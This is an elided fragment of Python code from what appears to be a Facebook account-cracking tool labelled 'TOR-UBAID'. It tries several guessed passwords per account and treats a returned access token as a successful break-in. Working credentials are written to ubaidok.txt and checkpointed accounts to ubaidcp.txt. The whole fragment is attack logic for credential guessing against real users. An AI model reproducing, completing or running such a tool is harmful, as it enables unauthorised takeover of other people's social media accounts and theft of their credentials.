						...
						if "www.facebook.com" in q["error_msg"]:
							...
							if "access_token" in q:
								...
								if "www.facebook.com" in q["error_msg"]:
									...
									q = json.loads(data)
									if "access_token" in q:
										print(" \033[1;32m [TOR-UBAID-OK] "+uid+" | "+pass4+"\033[0;97m")
										ok = open("ubaidok.txt", "a")
										ok.write(uid+"|"+pass4+"\n")
										ok.close()
										...
										if "www.facebook.com" in q["error_msg"]:
											...
											q = json.loads(data)
											if "access_token" in q:
												print(" \033[1;32m [TOR-UBAID-OK] "+uid+" | "+pass5+"\033[0;97m")
												ok = open("ubaidok.txt", "a")
												ok.write(uid+"|"+pass5+"\n")
												ok.close()
...
def ran():
	...
	def main(arg):
		...
		try:
			...
			q = json.loads(data)
			if "access_token" in q:
				print(" \033[1;32m[TOR-UBAID-OK] "+k+co+user+" | "+q["uid"]+" | "+pass1+"\033[0;97m")
				ok = open("ubaidok.txt", "a")
				...
				if "www.facebook.com" in q["error_msg"]:
					...
					q = json.loads(data)
					if "access_token" in q:
						print(" \033[1;32m[TOR-UBAID-OK] "+k+co+user+" | "+q["uid"]+" | "+pass2+"\033[0;97m")
						ok = open("ubaidok.txt", "a")
						...
						if "www.facebook.com" in q["error_msg"]:
							...
							if "access_token" in q:
								...
								if "www.facebook.com" in q["error_msg"]:
									print(" \033[1;33m [TOR-UBAID-CP] "+k+co+user+" | "+pass3+"\033[0;97m")
									cp = open("ubaidcp.txt", "a")
